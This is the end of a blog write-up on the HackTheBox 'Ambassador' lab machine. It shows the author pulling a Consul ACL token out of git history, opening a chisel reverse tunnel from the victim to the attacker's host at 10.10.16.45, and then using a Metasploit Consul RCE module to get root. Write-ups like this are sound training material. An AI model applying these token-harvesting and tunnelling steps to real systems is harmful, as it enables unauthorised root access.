</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>@@</span><span class=w> </span><span class=o>-</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=w> </span><span class=o>+</span><span class=mi>1</span><span class=p>,</span><span class=mi>4</span><span class=w> </span><span class=o>@@</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+#</span><span class=w> </span><span class=n>We</span><span class=w> </span><span class=n>use</span><span class=w> </span><span class=n>Consul</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>application</span><span class=w> </span><span class=n>config</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>production</span><span class=p>,</span><span class=w> </span><span class=n>this</span><span class=w> </span><span class=n>script</span><span class=w> </span><span class=n>will</span><span class=w> </span><span class=n>help</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>correct</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>app</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+#</span><span class=w> </span><span class=n>Export</span><span class=w> </span><span class=n>MYSQL_PASSWORD</span><span class=w> </span><span class=k>before</span><span class=w> </span><span class=n>running</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=n>consul</span><span class=w> </span><span class=n>kv</span><span class=w> </span><span class=n>put</span><span class=w> </span><span class=c1>--token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
</span></span></span></code></pre></td></tr></table></div></div><p>Find the token for the Consul service used on the machine.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
</span></span></code></pre></td></tr></table></div></div><p>Also find out the version of the service:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>developer@ambassador:/opt/my-app/.git$ apt list <span class=p>|</span> grep <span class=s2>&#34;consul&#34;</span>
</span></span><span class=line><span class=cl>consul/focal,now 1.13.2-1 amd64 <span class=o>[</span>installed<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Find an exploit for the RCE in Metasploit:
<img loading=lazy src=/ambassador/static_7.png alt=media2></p><p>But we can&rsquo;t use it, because of disabling UI on victim machine:
<img loading=lazy src=/ambassador/static_8.png alt=media2></p><p>So let&rsquo;s set up a TCP tunneling from Ambassador machine to ours to exploit the vulnerability.</p><p><a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding>https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding</a>.</p><p>We will use a <code>chisel</code>.</p><p>On the local machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>~/tools&gt; ./chisel server -p 8080 --reverse
</span></span><span class=line><span class=cl>2022/10/24 22:58:49 server: Reverse tunnelling enabled
</span></span><span class=line><span class=cl>2022/10/24 22:58:49 server: Fingerprint ``tx4Ngv/UtweTvoIMDAuUoDe7G6BoF9m88xU+//DNXSM=
</span></span><span class=line><span class=cl>2022/10/24 22:58:49 server: Listening on http://0.0.0.0:8080
</span></span></code></pre></td></tr></table></div></div><p>On the victim machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>developer@ambassador:~/.tmp$ ./chisel client 10.10.16.45:8080 R:8500:127.0.0.1:8500
</span></span><span class=line><span class=cl>2022/10/24 19:05:36 client: Connecting to ws://10.10.16.45:8080
</span></span><span class=line><span class=cl>2022/10/24 19:05:38 client: Connected (Latency 130.006367ms)
</span></span></code></pre></td></tr></table></div></div><p>Great, now we can access Consul at 127.0.0.1:8500.</p><p>Let&rsquo;s set the parameters for the pailoit in metasploit:
<img loading=lazy src=/ambassador/static_9.png alt=media2></p><p>Where <strong>RHOSTS</strong> and <strong>RPORT</strong> is the address to reach Consul, <strong>ACL_TOKEN</strong> is the previously found token, and <strong>LHOST</strong> and <strong>LPORT</strong> are the attacker&rsquo;s machine.</p><p>Run it and get the root.
<img loading=lazy src=/ambassador/static_10.png alt=media2></p><h3 id=pwned>Pwned.<a hidden class=anchor aria-hidden=true href=#pwned>#</a></h3></div><footer class=post-footer><ul class=post-tags><li><a href=https://examplesite.com/tags/hackthebox/>hackthebox</a></li><li><a href=https://examplesite.com/tags/path-traversal/>path traversal</a></li><li><a href=https://examplesite.com/tags/cve-2021-43798/>CVE-2021-43798</a></li><li><a href=https://examplesite.com/tags/rce/>RCE</a></li></ul><nav class=paginav><a class=prev href=https://examplesite.com/posts/meta-two-htb/><span class=title>« Prev</span><br><span>HTB MetaTwo: SQLi in Wordpress via CVE-2022-0739 and data leak via XXE CVE-2021-29447</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service on twitter" href="https://twitter.com/intent/tweet/?text=HTB%20Ambassador%3a%20Path%20Traversal%20CVE-2021-43798%20and%20RCE%20in%20Consul%20service&url=https%3a%2f%2fexamplesite.com%2fposts%2fambasador%2f&hashtags=hackthebox%2cpathtraversal%2cCVE-2021-43798%2cRCE"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fexamplesite.com%2fposts%2fambasador%2f&title=HTB%20Ambassador%3a%20Path%20Traversal%20CVE-2021-43798%20and%20RCE%20in%20Consul%20service&summary=HTB%20Ambassador%3a%20Path%20Traversal%20CVE-2021-43798%20and%20RCE%20in%20Consul%20service&source=https%3a%2f%2fexamplesite.com%2fposts%2fambasador%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fexamplesite.com%2fposts%2fambasador%2f&title=HTB%20Ambassador%3a%20Path%20Traversal%20CVE-2021-43798%20and%20RCE%20in%20Consul%20service"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fexamplesite.com%2fposts%2fambasador%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service on whatsapp" href="https://api.whatsapp.com/send?text=HTB%20Ambassador%3a%20Path%20Traversal%20CVE-2021-43798%20and%20RCE%20in%20Consul%20service%20-%20https%3a%2f%2fexamplesite.com%2fposts%2fambasador%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service on telegram" href="https://telegram.me/share/url?text=HTB%20Ambassador%3a%20Path%20Traversal%20CVE-2021-43798%20and%20RCE%20in%20Consul%20service&url=https%3a%2f%2fexamplesite.com%2fposts%2fambasador%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://examplesite.com/>3NNL's stuff</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>